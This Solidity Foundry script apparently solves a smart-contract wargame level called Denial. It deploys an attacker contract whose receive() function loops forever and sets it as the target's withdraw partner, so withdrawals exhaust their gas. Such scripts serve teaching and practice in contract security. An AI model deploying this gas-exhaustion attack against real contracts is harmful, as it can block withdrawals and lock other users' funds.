// SPDX-License-Identifier: MIT

pragma solidity 0.8.0;

import "../instance/Level20.sol";
import "forge-std/Script.sol";

contract ExploitLevel20 is Script {
    Denial instance = Denial(payable(0xa1D42DA2040f7047721b77773f875832204DfbBA));

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        AttackDenial attackD = new AttackDenial();
        instance.setWithdrawPartner(address(attackD));
    }
}

contract AttackDenial {
    uint256 dummy;

    receive() external payable {
        while (true) {
            dummy = type(uint256).max;
            console.log("Gas Left", gasleft());
        }
    }
}
